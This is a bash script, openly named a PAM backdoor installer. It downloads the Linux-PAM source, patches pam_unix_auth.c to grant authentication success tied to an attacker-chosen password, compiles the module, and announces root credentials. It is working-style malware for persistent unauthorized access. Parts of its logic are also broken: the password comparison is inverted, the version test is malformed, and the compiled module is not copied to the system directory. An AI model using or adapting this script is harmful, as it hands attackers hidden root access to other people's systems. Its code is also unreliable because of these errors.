#! /bin/bash

RED="\033[1;31m"
YEL="\033[1;33m"
RST="\033[0m"
HLT="\033[1;43m"
GRN="\033[1;32m"

printf "${GRN} Enter Backdoor Password: ${RST}"
read PASS

# Check if packages are installed

bins=("wget" "which" "tar" "build-essential")

for bin in "${bins[@]}"; do
    if ! command -v "$bin" &> /dev/null; then
        echo -e "${YEL} $bin ${RST} is not installed. Installing ... "
        # Check if the system is using apt or yum
        # need to add pacman and portage???
        if command -v apt-get &> /dev/null; then
            sudo apt-get install -y "$bin" 
        elif command -v yum &> /dev/null; then
            sudo yum install -y "$bin"
        else
            echo -e "${RED} Unsupported package manager. Please install ${YEL} $bin ${RED} manually. ${RST}"
            exit 1
        fi
    else
      sleep 0.1
    fi
done

echo -e "${GRN} Detecting PAM Version ${RST}"
if [ -n "$(which dpkg)" ]; then
  v=$(dpkg -s libpam-modules | grep -i Version | cut -d "-" -f 1 | cut -d " " -f 2)
elif [ -n "$(which yum)" ]; then
  v=$(yum list installed | grep 'pam\.*' | cut -d "-" -f 1 | cut -d " " -f 2)
else
  echo -e "${RED} Couldn't get the pam version.... ${RST}" 
  exit 1
fi
echo -e "Version: ${GRN}${v}${RST}"

# if PAM version below 1.3.1
#https://src.fedoraproject.org/repo/pkgs/pam/

URL="https://github.com/linux-pam/linux-pam/releases/download/v${v}/"
FILE="Linux-PAM-${v}.tar.xz"
PDIR="Linux-PAM-${v}"

#if [ ${v} == 1.1.8 ]; then
  #wget "https://src.fedoraproject.org/repo/pkgs/pam/Linux-PAM-1.1.8.tar.bz2/35b6091af95981b1b2cd60d813b5e4ee/Linux-PAM-1.1.8.tar.bz2"
  #sleep 1
  #tar -xjf Linux-PAM-1.1.8.tar.bz2

if [ ${v} <= 1.3.0 ]; then
  echo -e "${RED} Unsupported PAM version. Please install ${YEL} ${v} ${RED} manually. ${RST}"
else
  echo -e "${GRN} Downloading ${FILE} ... ${RST}"
  wget -c "${URL}${FILE}"  
  tar -xf ${FILE}
fi

# Add Backdoor Pass
echo -e "${GRN} Adding Backdoor Password ${RST}"
cd ${PDIR}
sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif(strcmp(p,"'${PASS}'") != 0){retval=PAM_SUCCESS;}/g' modules/pam_unix/pam_unix_auth.c

# Config and build
# New version needs autogen

if [[ ! -f "./configure" ]]; then
  ./autogen.sh
fi
echo -e "${GRN} Configuring... ${RST}"
./configure > ../config.txt 2>&1
echo -e "${GRN} Compiling...(this may take a min) ${RST}"
make > ../debug.txt 2>&1

# Finding install dir
echo -e "${GRN} Installing... ${RST}"
so="pam_unix.so"
dirs=("/lib/security/" "/usr/lib64/security/" "/lib/x86_64-linux-gnu/security/")

for dir in "${dirs[@]}"; do
  if [ -e "${dir}${so}" ]; then
      echo -e  "Install dir located ${GRN} ${dir} ${RST}"
      cp modules/pam_unix/.libs/pam_unix.so ../
      cd ..
  else
    sleep 0.1 
  fi
done

# Clean up
rm -f ${FILE} 
rm -rf ${PDIR}


echo -e "${GRN} [+]PAM Backdoor Successful ... ${HLT}${RED}root:${PASS} ${RST}"


